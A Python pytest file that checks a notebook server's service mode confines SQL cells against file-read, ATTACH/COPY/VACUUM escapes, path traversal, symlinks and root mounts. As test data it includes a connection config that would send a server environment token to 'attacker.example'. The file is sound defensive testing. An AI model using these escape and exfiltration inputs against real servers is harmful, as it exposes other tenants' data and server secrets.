"""Service mode confines a SQL cell to its own database and lake.

SQL cells run in the server process, so unconfined they could read any server
file (``/proc/self/environ``) or write anywhere via ``COPY ... TO``, ``ATTACH``
or ``VACUUM INTO``. Personal mode stays unconfined.
"""

from __future__ import annotations

from pathlib import Path

import duckdb
import pytest

from strata.config import StrataConfig
from strata.notebook.executor import CellExecutor
from strata.notebook.models import ConnectionSpec
from strata.notebook.parser import parse_notebook
from strata.notebook.session import NotebookSession
from strata.notebook.sql.registry import get_adapter
from strata.notebook.writer import add_cell_to_notebook, create_notebook, write_cell


@pytest.fixture
def outside(tmp_path) -> Path:
    """A file the server can read that no notebook should."""
    path = tmp_path / "server-only" / "secret.txt"
    path.parent.mkdir()
    path.write_text("do not read")
    return path


@pytest.fixture
def database(tmp_path) -> Path:
    path = tmp_path / "nb.duckdb"
    conn = duckdb.connect(str(path))
    conn.execute("CREATE TABLE t AS SELECT 1 AS x")
    conn.close()
    return path


def _open(path: Path, confine_to: list[str], *, read_only: bool = True):
    spec = ConnectionSpec(name="db", driver="duckdb", path=str(path))
    spec = spec.model_copy(update={"confine_to": confine_to})
    return get_adapter("duckdb").open(spec, read_only=read_only)


def test_a_confined_read_connection_reads_its_own_tables_and_nothing_else(database, outside):
    conn = _open(database, [])

    assert conn.execute("SELECT x FROM t").fetchall() == [(1,)]
    with pytest.raises(duckdb.PermissionException):
        conn.execute(f"SELECT content FROM read_text('{outside}')").fetchall()
    with pytest.raises(duckdb.InvalidInputException):
        conn.execute("SET enable_external_access = true")
    # A cursor, which the executor runs statements on, is confined too.
    with pytest.raises(duckdb.PermissionException):
        conn.cursor().execute(f"SELECT content FROM read_text('{outside}')").fetchall()


def test_a_confined_write_connection_writes_its_database_and_no_other_file(
    database, outside, tmp_path
):
    conn = _open(database, [], read_only=False)

    conn.execute("INSERT INTO t VALUES (2)")
    assert conn.execute("SELECT count(*) FROM t").fetchone() == (2,)
    leak = tmp_path / "leak.csv"
    with pytest.raises(duckdb.PermissionException):
        conn.execute(f"COPY t TO '{leak}'")
    with pytest.raises(duckdb.PermissionException):
        conn.execute(f"ATTACH '{tmp_path / 'other.duckdb'}' AS other")
    assert not leak.exists()


def test_a_location_it_is_confined_to_stays_readable(database, outside, tmp_path):
    allowed = tmp_path / "allowed"
    allowed.mkdir()
    (allowed / "data.csv").write_text("a\n1\n")

    conn = _open(database, [f"{allowed}/"])

    assert conn.execute(f"SELECT a FROM read_csv('{allowed / 'data.csv'}')").fetchall() == [(1,)]
    with pytest.raises(duckdb.PermissionException):
        conn.execute(f"SELECT content FROM read_text('{outside}')").fetchall()


def _notebook(tmp_path: Path, source: str) -> Path:
    nb_dir = create_notebook(tmp_path, "confine")
    add_cell_to_notebook(nb_dir, "c1", language="sql")
    write_cell(nb_dir, "c1", source)
    toml = nb_dir / "notebook.toml"
    toml.write_text(toml.read_text() + '\n[connections.db]\ndriver = "duckdb"\npath = ":memory:"\n')
    return nb_dir


@pytest.mark.parametrize(
    ("mode", "readable"), [("personal", True), ("service", False)], ids=["personal", "service"]
)
@pytest.mark.asyncio
async def test_only_service_mode_confines_a_sql_cell(
    tmp_path, monkeypatch, outside, mode, readable
):
    config = StrataConfig(cache_dir=tmp_path / "cache", deployment_mode=mode)
    monkeypatch.setattr(NotebookSession, "_lake_config", lambda self: config)
    source = f"# @sql connection=db\nSELECT content FROM read_text('{outside}')\n"
    nb_dir = _notebook(tmp_path, source)
    session = NotebookSession(parse_notebook(nb_dir), nb_dir)

    result = await CellExecutor(session).execute_cell("c1", source)

    assert result.success is readable, result.error
    if not readable:
        assert "Permission" in (result.error or "")


@pytest.mark.parametrize(
    ("sql", "refused"),
    [
        ("ATTACH 'x.db' AS o", "ATTACH"),
        ("/* hidden */ attach database 'x.db' as o", "ATTACH"),
        ("DETACH o", "DETACH"),
        ("VACUUM INTO '/tmp/copy.db'", "VACUUM"),
        ("INSERT INTO t VALUES (1); VACUUM", "VACUUM"),
        ("CREATE TABLE t(x); INSERT INTO t SELECT 1", None),
    ],
)
def test_a_confined_sqlite_write_cell_is_refused_what_reaches_other_files(sql, refused):
    from strata.notebook.sql.analyzer import confined_write_violation

    violation = confined_write_violation(sql, "sqlite")
    if refused is None:
        assert violation is None
    else:
        assert violation is not None and refused in violation


@pytest.mark.parametrize(
    ("mode", "allowed"), [("personal", True), ("service", False)], ids=["personal", "service"]
)
@pytest.mark.asyncio
async def test_only_service_mode_refuses_a_sqlite_write_cell_attaching_another_file(
    tmp_path, monkeypatch, mode, allowed
):
    import sqlite3

    other = tmp_path / "other.sqlite"
    with sqlite3.connect(other) as conn:
        conn.execute("CREATE TABLE secret(x)")
    config = StrataConfig(cache_dir=tmp_path / "cache", deployment_mode=mode)
    monkeypatch.setattr(NotebookSession, "_lake_config", lambda self: config)
    nb_dir = create_notebook(tmp_path, "confine_sqlite")
    add_cell_to_notebook(nb_dir, "c1", language="sql")
    source = f"# @sql connection=db write=true\nATTACH '{other}' AS o\n"
    write_cell(nb_dir, "c1", source)
    toml = nb_dir / "notebook.toml"
    toml.write_text(
        toml.read_text()
        + f'\n[connections.db]\ndriver = "sqlite"\npath = "{tmp_path / "mine.sqlite"}"\n'
    )
    session = NotebookSession(parse_notebook(nb_dir), nb_dir)

    result = await CellExecutor(session).execute_cell("c1", source)

    assert result.success is allowed, result.error
    if not allowed:
        assert "ATTACH" in (result.error or "")


# --- A local mount root bounds how much of the server's disk a read cell reads ---


@pytest.mark.parametrize(
    ("mode", "readable"), [("personal", True), ("service", False)], ids=["personal", "service"]
)
@pytest.mark.asyncio
async def test_a_mount_whose_root_holds_server_state_is_refused(
    tmp_path, monkeypatch, mode, readable
):
    """A mount whose root holds the server's artifact store is refused; it would expose the
    store."""
    from strata.notebook.models import MountSpec
    from strata.notebook.writer import update_notebook_mounts

    server_root = tmp_path / "srv"
    secret = server_root / "artifacts" / "secret.txt"
    secret.parent.mkdir(parents=True)
    secret.write_text("another tenant's artifact")
    (server_root / "data.csv").write_text("a\n1\n")
    config = StrataConfig(
        cache_dir=tmp_path / "cache", deployment_mode=mode, artifact_dir=secret.parent
    )
    monkeypatch.setattr(NotebookSession, "_lake_config", lambda self: config)
    source = f"# @sql connection=db\nSELECT content FROM read_text('{secret}')\n"
    nb_dir = create_notebook(tmp_path, "mount_root")
    add_cell_to_notebook(nb_dir, "c1", language="sql")
    write_cell(nb_dir, "c1", source)
    update_notebook_mounts(nb_dir, [MountSpec(name="srv", uri=server_root.as_uri())])
    toml = nb_dir / "notebook.toml"
    toml.write_text(
        toml.read_text() + '\n[connections.db]\ndriver = "duckdb"\npath = ":memory:"\n'
        'mounts = ["srv"]\n'
    )
    session = NotebookSession(parse_notebook(nb_dir), nb_dir)

    result = await CellExecutor(session).execute_cell("c1", source)

    assert result.success is readable, result.error
    if not readable:
        assert "mount 'srv'" in (result.error or "")
        assert "artifact" in (result.error or "")


class TestLocalMountRoots:
    """Which local roots a confined SQL cell may mount, checked before reading anything
    under them (fingerprinting ``/`` would walk the whole disk).
    """

    @pytest.fixture
    def config(self, tmp_path):
        return StrataConfig(
            cache_dir=tmp_path / "state" / "cache",
            artifact_dir=tmp_path / "state" / "artifacts",
            metadata_db=tmp_path / "state" / "meta" / "meta.sqlite",
            notebook_storage_dir=tmp_path / "notebooks",
            deployment_mode="service",
        )

    @staticmethod
    def _problem(uri: str, config, notebook_dir=None) -> str | None:
        from strata.notebook.sql.lake import local_mount_root_problem

        return local_mount_root_problem(uri, config, notebook_dir)

    @pytest.mark.parametrize("uri", ["file:///", "/", "file:///data", "/usr"])
    def test_the_filesystem_root_and_top_level_directories(self, uri, config):
        assert self._problem(uri, config) is not None

    def test_a_link_to_the_root_is_the_root(self, tmp_path, config):
        link = tmp_path / "data" / "everything"
        link.parent.mkdir()
        link.symlink_to("/")

        assert self._problem(link.as_uri(), config) is not None

    @pytest.mark.parametrize(
        "subpath", ["state", "state/cache", "state/meta", "notebooks", "state/artifacts"]
    )
    def test_a_root_holding_server_state(self, tmp_path, config, subpath):
        assert self._problem((tmp_path / subpath).as_uri(), config) is not None

    def test_the_servers_home_and_what_is_in_it(self, config):
        home = Path.home()

        assert self._problem(home.as_uri(), config) is not None
        assert self._problem((home / ".aws").as_uri(), config) is not None

    def test_the_process_filesystem(self, config):
        assert self._problem("file:///proc/self", config) is not None

    @pytest.mark.parametrize(
        "subpath",
        ["state/artifacts/blobs", "state/cache/t1", "notebooks/other", "notebooks/other/data"],
    )
    def test_a_root_inside_server_state(self, tmp_path, config, subpath):
        problem = self._problem(
            (tmp_path / subpath).as_uri(), config, tmp_path / "notebooks" / "nb"
        )

        assert problem is not None and "is inside the server's" in problem

    def test_a_notebooks_own_data_and_other_directories_are_fine(self, tmp_path, config):
        own = tmp_path / "notebooks" / "nb"

        assert self._problem(own.as_uri(), config, own) is None
        assert self._problem((own / "data").as_uri(), config, own) is None
        assert self._problem((tmp_path / "lake" / "raw").as_uri(), config, own) is None
        assert self._problem("s3://bucket/", config, own) is None


@pytest.mark.parametrize("where", ["artifact-store", "own"])
@pytest.mark.asyncio
async def test_a_service_mount_inside_server_state_is_refused(tmp_path, monkeypatch, where):
    """A root under the artifact store reads its blobs; the notebook's own directory,
    though inside notebook storage, is the notebook's to read."""
    from strata.notebook.models import MountSpec
    from strata.notebook.writer import update_notebook_mounts

    config = StrataConfig(
        cache_dir=tmp_path / "state" / "cache",
        artifact_dir=tmp_path / "state" / "artifacts",
        notebook_storage_dir=tmp_path / "notebooks",
        deployment_mode="service",
    )
    monkeypatch.setattr(NotebookSession, "_lake_config", lambda self: config)
    nb_dir = create_notebook(tmp_path / "notebooks", "inside")
    root = (
        tmp_path / "state" / "artifacts" / "blobs" if where == "artifact-store" else nb_dir / "data"
    )
    root.mkdir(parents=True)
    (root / "data.csv").write_text("a\n1\n")
    source = f"# @sql connection=db\nSELECT a FROM read_csv('{root / 'data.csv'}')\n"
    add_cell_to_notebook(nb_dir, "c1", language="sql")
    write_cell(nb_dir, "c1", source)
    update_notebook_mounts(nb_dir, [MountSpec(name="srv", uri=root.as_uri())])
    toml = nb_dir / "notebook.toml"
    toml.write_text(
        toml.read_text() + '\n[connections.db]\ndriver = "duckdb"\npath = ":memory:"\n'
        'mounts = ["srv"]\n'
    )
    session = NotebookSession(parse_notebook(nb_dir), nb_dir)

    result = await CellExecutor(session).execute_cell("c1", source)

    if where == "own":
        assert result.success, result.error
        return
    assert not result.success
    assert "mount 'srv'" in (result.error or "")
    assert "inside the server's artifact store" in (result.error or "")


# --- A service-mode cell opens only a database file its notebook may read ---


class TestDatabaseFile:
    """The server opens a SQLite or DuckDB file itself, so in service mode the file
    must be in the notebook's directory or somewhere a mount root could be: never
    the metadata database, the artifact store or another notebook.
    """

    @pytest.fixture
    def server(self, tmp_path):
        import sqlite3

        state = tmp_path / "state" / "artifacts"
        state.mkdir(parents=True)
        metadata = state / "artifacts.sqlite"
        other = tmp_path / "notebooks" / "other" / "data.sqlite"
        other.parent.mkdir(parents=True)
        shared = tmp_path / "shared" / "warehouse.sqlite"
        shared.parent.mkdir()
        for path in (metadata, other, shared):
            with sqlite3.connect(path) as conn:
                conn.execute("CREATE TABLE secret(x)")
                conn.execute("INSERT INTO secret VALUES ('token')")
        return {"metadata": metadata, "other": other, "shared": shared}

    @staticmethod
    def _config(tmp_path, mode):
        return StrataConfig(
            cache_dir=tmp_path / "state" / "cache",
            artifact_dir=tmp_path / "state" / "artifacts",
            notebook_storage_dir=tmp_path / "notebooks",
            deployment_mode=mode,
        )

    @staticmethod
    def _notebook(tmp_path, connection: str, *, write: bool = False) -> tuple[Path, str]:
        nb_dir = create_notebook(tmp_path / "notebooks", "mine")
        add_cell_to_notebook(nb_dir, "c1", language="sql")
        if write:
            source = "# @sql connection=db write=true\nUPDATE secret SET x = 'mine'\n"
        else:
            source = "# @sql connection=db\nSELECT x FROM secret\n"
        write_cell(nb_dir, "c1", source)
        toml = nb_dir / "notebook.toml"
        toml.write_text(toml.read_text() + f'\n[connections.db]\ndriver = "sqlite"\n{connection}\n')
        return nb_dir, source

    @pytest.mark.parametrize("write", [False, True], ids=["read", "write"])
    @pytest.mark.parametrize(
        "connection",
        [
            'path = "{metadata}"',
            'path = "../other/data.sqlite"',
            'uri = "file:{metadata}"',
        ],
        ids=["absolute", "dotdot", "uri"],
    )
    @pytest.mark.parametrize("mode", ["personal", "service"])
    @pytest.mark.asyncio
    async def test_a_server_file_is_refused_in_service_mode(
        self, tmp_path, monkeypatch, server, connection, write, mode
    ):
        import sqlite3

        config = self._config(tmp_path, mode)
        monkeypatch.setattr(NotebookSession, "_lake_config", lambda self: config)
        nb_dir, source = self._notebook(
            tmp_path, connection.format(metadata=server["metadata"]), write=write
        )
        session = NotebookSession(parse_notebook(nb_dir), nb_dir)

        result = await CellExecutor(session).execute_cell("c1", source)

        if mode == "personal":
            assert result.success, result.error
            return
        assert not result.success
        assert "connection 'db'" in (result.error or "")
        for path in (server["metadata"], server["other"]):
            with sqlite3.connect(path) as conn:
                assert conn.execute("SELECT x FROM secret").fetchall() == [("token",)]

    @pytest.mark.parametrize("where", ["own", "shared"])
    @pytest.mark.asyncio
    async def test_its_own_file_and_one_outside_server_state_open(
        self, tmp_path, monkeypatch, server, where
    ):
        import sqlite3

        config = self._config(tmp_path, "service")
        monkeypatch.setattr(NotebookSession, "_lake_config", lambda self: config)
        path = "own.sqlite" if where == "own" else str(server["shared"])
        nb_dir, source = self._notebook(tmp_path, f'path = "{path}"')
        if where == "own":
            with sqlite3.connect(nb_dir / path) as conn:
                conn.execute("CREATE TABLE secret(x)")
                conn.execute("INSERT INTO secret VALUES ('mine')")
        session = NotebookSession(parse_notebook(nb_dir), nb_dir)

        result = await CellExecutor(session).execute_cell("c1", source)

        assert result.success, result.error

    def test_a_link_out_of_the_notebook_is_followed(self, tmp_path, server):
        from strata.notebook.sql.cell_executor import database_problem

        nb_dir = create_notebook(tmp_path / "notebooks", "mine")
        (nb_dir / "data.sqlite").symlink_to(server["metadata"])
        spec = ConnectionSpec(name="db", driver="sqlite", path="data.sqlite")

        problem = database_problem(spec, nb_dir, self._config(tmp_path, "service"))

        assert problem is not None and "artifact store" in problem


@pytest.mark.parametrize("write", [False, True], ids=["read", "write"])
@pytest.mark.asyncio
async def test_a_service_mode_cell_reads_auth_vars_from_the_notebook_env(
    tmp_path, monkeypatch, write
):
    """The server's environment never reaches a host the notebook names."""
    from strata.notebook.sql.drivers.postgresql import PostgresAdapter

    config = StrataConfig(cache_dir=tmp_path / "cache", deployment_mode="service")
    monkeypatch.setattr(NotebookSession, "_lake_config", lambda self: config)
    monkeypatch.setenv("SERVER_ONLY_TOKEN", "server-secret")
    dialed: list[str] = []

    def record(self, uri):
        dialed.append(uri)
        raise RuntimeError("not dialing")

    monkeypatch.setattr(PostgresAdapter, "_invoke_connect", record)
    nb_dir = create_notebook(tmp_path, "auth_env")
    add_cell_to_notebook(nb_dir, "c1", language="sql")
    source = f"# @sql connection=db{' write=true' if write else ''}\nSELECT 1\n"
    write_cell(nb_dir, "c1", source)
    toml = nb_dir / "notebook.toml"
    toml.write_text(
        toml.read_text() + '\n[connections.db]\ndriver = "postgresql"\nhost = "attacker.example"\n'
        '[connections.db.auth]\nuser = "${SERVER_ONLY_TOKEN}"\n'
    )
    session = NotebookSession(parse_notebook(nb_dir), nb_dir)

    result = await CellExecutor(session).execute_cell("c1", source)

    assert not result.success
    assert "this notebook's env does not set" in (result.error or "")
    assert dialed == []


@pytest.mark.parametrize(
    ("mode", "key_file", "reads"),
    [
        ("service", "server", False),
        ("service", "dotdot", False),
        ("service", "own", True),
        ("personal", "server", True),
    ],
)
@pytest.mark.asyncio
async def test_a_service_mode_bigquery_key_file_is_the_notebooks_own(
    tmp_path, monkeypatch, outside, mode, key_file, reads
):
    """The server reads a BigQuery key file itself, so a member may not name one of its files."""
    from strata.notebook.sql.drivers.bigquery import BigQueryAdapter

    config = StrataConfig(cache_dir=tmp_path / "cache", deployment_mode=mode)
    monkeypatch.setattr(NotebookSession, "_lake_config", lambda self: config)
    opened: list[str] = []

    def record(self, kwargs):
        opened.append(kwargs["adbc.bigquery.sql.auth_credentials"])
        raise RuntimeError("not dialing")

    monkeypatch.setattr(BigQueryAdapter, "_invoke_connect", record)
    nb_dir = create_notebook(tmp_path, "bq")
    (nb_dir / "sa.json").write_text("{}")
    path = {"server": str(outside), "dotdot": "../server-only/secret.txt", "own": "sa.json"}
    add_cell_to_notebook(nb_dir, "c1", language="sql")
    source = "# @sql connection=db\nSELECT 1\n"
    write_cell(nb_dir, "c1", source)
    toml = nb_dir / "notebook.toml"
    toml.write_text(
        toml.read_text() + '\n[connections.db]\ndriver = "bigquery"\nproject_id = "p"\n'
        f'credentials_path = "{path[key_file]}"\n'
    )
    session = NotebookSession(parse_notebook(nb_dir), nb_dir)

    result = await CellExecutor(session).execute_cell("c1", source)

    assert not result.success
    assert bool(opened) is reads, result.error
    if not reads:
        assert "`credentials_path`" in (result.error or "")


def test_adapter_internal_keys_are_not_read_from_a_connection_block(tmp_path):
    """``confine_to``, ``mount_sources`` and ``catalog_properties`` are set by the
    executor; from notebook.toml or a request they would steer what the server opens."""
    internal = {
        "confine_to": [],
        "mount_sources": [{"name": "m", "uri": "file:///", "storage_options": {}}],
        "catalog_properties": {"uri": "http://attacker.example"},
    }

    spec = ConnectionSpec(name="db", driver="duckdb", path=":memory:", **internal)

    assert not set(internal) & set(spec.model_dump())
    nb_dir = create_notebook(tmp_path, "internal")
    toml = nb_dir / "notebook.toml"
    toml.write_text(
        toml.read_text() + '\n[connections.db]\ndriver = "duckdb"\npath = ":memory:"\n'
        "confine_to = []\n"
    )
    (parsed,) = parse_notebook(nb_dir).connections
    assert "confine_to" not in parsed.model_dump()
